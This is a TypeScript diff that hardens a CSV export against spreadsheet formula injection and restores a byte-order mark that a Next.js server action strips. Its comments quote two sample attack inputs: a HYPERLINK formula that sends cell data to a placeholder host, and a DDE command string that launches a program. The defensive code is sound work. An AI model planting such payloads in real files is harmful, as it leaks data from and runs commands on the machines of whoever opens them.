@@ -94,9 +94,34 @@ export function toRows(rows: string[][], headers: string[]): ParsedRow[] {
   });
 }
 
+/**
+ * A cell Excel will read as text rather than as a formula
+ * (docs/AUDIT-2026-09.md, finding 6).
+ *
+ * A student's name is free text typed at the desk, or imported from a CSV somebody was
+ * sent. `=HYPERLINK("http://x/"&A1,"اضغط هنا")` in a name survives the round trip and
+ * runs when the exported register is opened — by the centre's own staff, on the
+ * centre's own machine, from a file this system produced. `@` and a leading `+` or `-`
+ * do the same: `+cmd|' /C calc'!A0` is a formula, not a number.
+ *
+ * The one exception is a value that is a sign followed by digits, because a phone is
+ * stored as `+201012345678` and that is arithmetic — no function, no DDE. Escaping it
+ * would put a visible apostrophe in front of every phone number in the file, which is
+ * a real cost for no gain.
+ */
+const ALWAYS_DANGEROUS = /^[=@\t\r]/;
+/** A sign followed by nothing but digits and spaces: a number, however long. */
+const PLAIN_NUMBER = /^[+-][\d\s]+$/;
+
+function neutralizeFormula(text: string): string {
+  if (ALWAYS_DANGEROUS.test(text)) return `'${text}`;
+  if (/^[+-]/.test(text) && !PLAIN_NUMBER.test(text)) return `'${text}`;
+  return text;
+}
+
 /** Quotes a field only when it needs it, so the common case stays readable. */
 export function toCsvField(value: string | number | null | undefined): string {
-  const text = value === null || value === undefined ? "" : String(value);
+  const text = neutralizeFormula(value === null || value === undefined ? "" : String(value));
   return /[",\n\r]/.test(text) ? `"${text.replace(/"/g, '""')}"` : text;
 }
 
@@ -104,5 +129,23 @@ export function toCsv(headers: readonly string[], rows: readonly (string | numbe
   const lines = [headers.map(toCsvField).join(",")];
   for (const row of rows) lines.push(row.map(toCsvField).join(","));
   // The BOM is what makes Excel open Arabic as UTF-8 instead of mojibake.
-  return `﻿${lines.join("\r\n")}\r\n`;
+  return `${BOM}${lines.join("\r\n")}\r\n`;
+}
+
+const BOM = "﻿";
+
+/**
+ * Puts the BOM back if it did not survive the trip to the browser
+ * (docs/AUDIT-2026-09.md, finding 13).
+ *
+ * `toCsv` writes one. A Next.js server action does not return it: the leading U+FEFF is
+ * gone by the time the client has the string, so every exported register was opening in
+ * Excel as mojibake — the exact thing the BOM was added to prevent. The unit test never
+ * saw it, because it tests the function and the bug is in the wire.
+ *
+ * So the file is assembled where it is written, not where it is generated. Idempotent,
+ * so it stays correct if the framework ever stops eating it.
+ */
+export function ensureBom(csv: string): string {
+  return csv.startsWith(BOM) ? csv : `${BOM}${csv}`;
 }
